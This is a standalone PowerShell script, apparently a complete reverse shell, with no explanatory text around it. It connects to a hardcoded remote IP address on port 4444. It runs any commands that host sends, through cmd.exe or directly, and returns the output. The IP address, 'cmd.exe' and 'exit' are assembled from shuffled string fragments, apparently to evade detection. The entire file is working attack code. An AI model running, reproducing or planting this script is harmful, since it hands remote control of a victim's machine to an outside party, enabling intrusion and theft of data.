$socket = new-object System.Net.Sockets.TcpClient(("{3}{0}{2}{4}{1}"-f '9.15','34','1','20','.149.2'), 4444);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
        $writer.Flush();
        $read = $null;
        $res = ""
        while($stream.DataAvailable -or $read -eq $null) {
                $read = $stream.Read($buffer, 0, 1024)
        }
        $out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
        if(!$out.equals(("{0}{1}" -f'e','xit'))){
                $args = "";
                if($out.IndexOf(' ') -gt -1){
                        $args = $out.substring($out.IndexOf(' ')+1);
                        $out = $out.substring(0,$out.IndexOf(' '));
                        if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = ("{0}{1}{2}" -f 'cm','d','.exe')
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = ('/'+'c '+"$out "+"$args")
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
                        }
                        else{
                                $res = (&"$out" "$args") | out-string;
                        }
                }
                else{
                        $res = (&"$out") | out-string;
                }
                if($res -ne $null){
        $writer.WriteLine($res)
    }
        }
}While (!$out.equals(("{1}{0}" -f'it','ex')))
$writer.close();
$socket.close();
$stream.Dispose()